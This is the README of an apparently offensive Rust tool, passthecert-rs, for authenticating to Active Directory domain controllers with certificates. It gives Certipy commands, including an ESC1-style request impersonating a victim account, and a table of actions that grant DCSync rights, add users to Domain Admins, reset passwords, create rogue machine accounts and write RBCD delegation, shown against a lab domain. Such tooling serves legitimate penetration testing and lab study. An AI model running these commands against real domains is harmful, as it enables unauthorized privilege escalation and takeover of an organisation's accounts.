<hr />

- [How to compile it?](#how-to-compile-it)
  - [Using Cargo](#using-cargo)
  - [Required dependencies](#required-dependencies)
- [Getting a certificate](#getting-a-certificate)
- [Transports (389 StartTLS vs 636 LDAPS)](#transports)
- [Actions](#actions)
- [Troubleshooting](#troubleshooting)

<hr />

# How to compile it?

## Using Cargo

```bash
cargo build --release
# Binary: ./target/release/passthecert-rs
./target/release/passthecert-rs -h
```

## Required dependencies

A recent Rust toolchain (edition 2021, Rust >= 1.85 recommended for the current
crate ecosystem). No system libraries are required: TLS is pure-Rust
(`rustls` + `ring`), and PKCS#12/PEM parsing is done in Rust.

<hr />

# Getting a certificate

Use [Certipy](https://github.com/ly4k/Certipy). Request a certificate, then
export the cert and key in PEM (the PEM path avoids PKCS#12 MAC issues with
some Certipy-generated PFX files):

```bash
# Request (adjust CA name and template to your environment; run `certipy find` first)
certipy req -u user@domain.local -p 'password' \
    -target ca.domain.local -ca 'DOMAIN-CA' -template User

# Or an ESC1-style request impersonating another principal (UPN + SID must match the target)
certipy req -u attacker@domain.local -p 'password' \
    -target ca.domain.local -ca 'DOMAIN-CA' -template User \
    -upn victim@domain.local -sid S-1-5-21-...-1234

# Extract PEM cert + key
certipy cert -pfx user.pfx -nokey -out user.crt
certipy cert -pfx user.pfx -nocert -out user.key
```

The certificate must carry the target account's **objectSid** for strong
certificate mapping (KB5014754). A PFX can also be passed directly with
`--pfx`/`--pfx-pass`, but PEM is more reliable across Certipy versions.

<hr />

# Transports

Certificate authentication is attempted differently on each channel, and
Domain Controllers vary in what they accept:

- **`--ldaps` (LDAPS, port 636)**: the DC maps the presented client certificate
  to an account at the TLS layer, with no explicit bind. This is what Certipy's
  Schannel connect uses, and works on DCs that reject SASL EXTERNAL.
- **default (StartTLS, port 389)**: the client presents the certificate during
  StartTLS, then binds with **SASL EXTERNAL**. Works on most DCs, but some
  (e.g. certain Server 2016) reset the connection or return
  `authMethodNotSupported`.

If one transport fails, try the other. TLS 1.2 is enforced for compatibility
with older DCs. Always target the DC **FQDN** (`-f`), because certificate
mapping is name-sensitive.

<hr />

# Actions

All actions run over the certificate-authenticated session. Common options:
`-d DOMAIN`, `-f DC_FQDN` (or `-i DC_IP`), `--crt`/`--key` (or `--pfx`/`--pfx-pass`),
`--ldaps`, `-v`/`-vv`. In the examples below the connection options are shortened
to `<conn>` = `-d essos.local -f meereen.essos.local --crt daenerys.crt --key daenerys.key --ldaps`.

| Action | Example | Description |
|---|---|---|
| `whoami` | `passthecert-rs <conn> --action whoami` | Confirm the identity the DC mapped from the certificate (RFC 4532 Who am I?). |
| `ldapshell` | `passthecert-rs <conn> --action ldapshell` | Interactive LDAP shell exposing every action (`whoami`, `search`, `add_member`, `elevate`, `write_rbcd`, `add_computer`, …). Type `help` inside. |
| `add_computer` | `passthecert-rs <conn> --action add_computer --computer-name "EVIL$" --computer-pass "P@ssw0rd!"` | Create a machine account (name/password random if omitted). Uses the machine account quota. |
| `del_computer` | `passthecert-rs <conn> --action del_computer --computer-name "EVIL$"` | Delete a machine account. |
| `modify_user` | `passthecert-rs <conn> --action modify_user --target khal.drogo --new-pass "NewP@ss1"` | Reset a user's password (`unicodePwd`). Requires write access to the target. |
| `modify_user --elevate` | `passthecert-rs <conn> --action modify_user --target khal.drogo --elevate` | Grant the target DCSync rights (adds DS-Replication-Get-Changes* ACEs on the domain root). |
| `add_member` | `passthecert-rs <conn> --action add_member --target khal.drogo --group "Domain Admins"` | Add a user/computer to a group. `--group` accepts a sAMAccountName or a full DN. |
| `remove_member` | `passthecert-rs <conn> --action remove_member --target khal.drogo --group "Domain Admins"` | Remove a user/computer from a group. |
| `enable_account` | `passthecert-rs <conn> --action enable_account --target khal.drogo` | Clear the ACCOUNTDISABLE flag (enable the account). |
| `disable_account` | `passthecert-rs <conn> --action disable_account --target khal.drogo` | Set the ACCOUNTDISABLE flag (disable the account). |
| `read_rbcd` | `passthecert-rs <conn> --action read_rbcd --delegate-to "MEEREEN$"` | List accounts allowed to act on behalf of the target (`msDS-AllowedToActOnBehalfOfOtherIdentity`). |
| `write_rbcd` | `passthecert-rs <conn> --action write_rbcd --delegate-to "MEEREEN$" --delegate-from "EVIL$"` | Allow `--delegate-from` to impersonate on `--delegate-to` via S4U2Proxy. |
| `remove_rbcd` | `passthecert-rs <conn> --action remove_rbcd --delegate-to "MEEREEN$" --delegate-from "EVIL$"` | Remove one RBCD entry from the target. |
| `flush_rbcd` | `passthecert-rs <conn> --action flush_rbcd --delegate-to "MEEREEN$"` | Clear all RBCD entries on the target. |
| `rusthound_ce` | `passthecert-rs <conn> --action rusthound_ce` | Run a full RustHound-CE (BloodHound-CE) collection over the certificate session, into the current directory, zipped. |

## ldap-shell commands

`--action ldapshell` opens an interactive shell that runs the same actions
against the authenticated session. Available commands:

```
whoami                          show the mapped identity
search <baseDN> [filter]        subtree search, prints DNs
dn <baseDN>                     search <baseDN> (objectClass=*)
add_member <user> <group>      add user/computer to a group
del_member <user> <group>      remove user/computer from a group
enable <user>                   enable an account
disable <user>                  disable an account
passwd <user> [newpass]         reset a user's password
elevate <user>                  grant DCSync rights
add_computer [name$] [pass]     create a machine account
del_computer <name$>            delete a machine account
read_rbcd <target$>             list RBCD entries
write_rbcd <target$> <from$>    allow from$ to impersonate on target$
remove_rbcd <target$> <from$>   remove one RBCD entry
flush_rbcd <target$>            clear all RBCD entries
rusthound_ce                    run a full RustHound-CE collection (current dir, zipped)
help | exit
```

<hr />

# Troubleshooting

- **`authMethodNotSupported` (StartTLS)** — the DC refuses SASL EXTERNAL over
  StartTLS; retry with `--ldaps`.
- **`Connection reset by peer` at bind (StartTLS)** — same cause; use `--ldaps`.
- **LDAPS handshake times out** — some Server 2016 DCs do not answer a TLS 1.3
  ClientHello; TLS 1.2 is already forced, but verify port 636 is open
  (`nc -vz DC 636`) and that the DC has a valid LDAPS server certificate.
- **Empty whoami / certificate not mapped** — the certificate SID does not match
  the target account, or the DC's enforcement mode (KB5014754) rejects the
  mapping. Verify the SID with `nxc ldap DC -u u -p p --query "(sAMAccountName=target)" objectSid`.
- **`MacError` on `--pfx`** — the PFX uses algorithms the PKCS#12 parser cannot
  verify; convert to PEM with Certipy or `openssl pkcs12` and use `--crt`/`--key`.